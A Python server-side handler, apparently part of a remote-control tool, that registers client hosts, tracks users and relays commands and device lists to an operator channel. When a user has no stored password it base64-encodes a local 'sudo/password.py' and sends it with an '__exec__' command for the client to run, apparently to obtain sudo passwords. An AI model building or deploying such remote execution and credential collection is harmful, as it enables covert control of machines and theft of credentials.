import threading, json, base64, os
from database.database_handler import \
 register_new_user, get_user_name_by_id, password_check
from thread_handler import send_msg_to_client, send_msg_to_su
from log import set_logger

logger = set_logger(__name__)

def send_cmd(cmd):
    current_Thread = threading.current_thread()
    current_Thread.data_handler.send_data(cmd)
    logger.debug(f'send_cmd {cmd}')    

def register_user(host_name):
    host_id = register_new_user(host_name)
    cmd = f'__register_id__|{host_id}'
    send_cmd(cmd)

def identify_user(user_id):
    current_Thread = threading.current_thread()
    user_name = get_user_name_by_id(user_id)
    current_Thread.user_name = user_name
    current_Thread.user_id = user_id
    has_password = password_check(user_id)
    if has_password is False:
        logger.debug("password not found send to get")
        path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "sudo/password.py")
        send_cmd_file(path)
    else:
        logger.debug(f"password found [id: {current_Thread.user_id}]")
        current_Thread.password = has_password

def archive_cmd(raw_data,data):
    try:
        sid = json.loads(data)['sid']
    except Exception:
        logger.exception("archive_cmd: ")
    else:
        send_msg_to_client(sid, raw_data)

def send_error_to_su(data):
    send_msg_to_su(data)

def send_cmd_file(file):
    try:
        content = open(file,'r').read()
    except Exception:
        logger.exception("send_cmd_file (file open failed)")
    else:
        message_bytes = content.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        cmd = '__exec__|' + base64_message
        send_cmd(cmd)

def send_device_list(data):
    from get_connected_devices import show_connected_devices
    import json
    device_list = show_connected_devices()
    try:
        sid = json.loads(data)['sid']
    except Exception:
        logger.exception("send_device_list: ")

    msg = {
        "devices" : device_list,
        "sid": sid
    }
    msg = json.dumps(msg)
    send_msg_to_su(msg)